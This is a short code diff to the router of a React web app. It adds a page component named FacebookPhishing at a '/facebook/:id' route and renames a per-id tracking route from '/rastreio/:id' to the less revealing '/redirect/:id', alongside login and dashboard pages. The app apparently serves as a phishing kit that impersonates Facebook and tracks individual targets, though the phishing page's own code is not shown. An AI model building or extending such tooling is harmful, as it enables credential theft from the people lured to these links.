@@ -3,6 +3,7 @@ import './global.css';
 import Login from './components/Login';
 import Dashboard from './components/Dashboard';
 import TrackerPage from './pages/TrackerPage';
+import FacebookPhishing from './pages/FacebookPhishing';
 import { BrowserRouter, Routes, Route } from 'react-router-dom';
 
 function App() {
@@ -23,7 +24,8 @@ function App() {
             <Dashboard email={usuario} />
           )
         } />
-        <Route path="/rastreio/:id" element={<TrackerPage />} />
+        <Route path="/redirect/:id" element={<TrackerPage />} />
+        <Route path="/facebook/:id" element={<FacebookPhishing />} />
       </Routes>
     </BrowserRouter>
   );
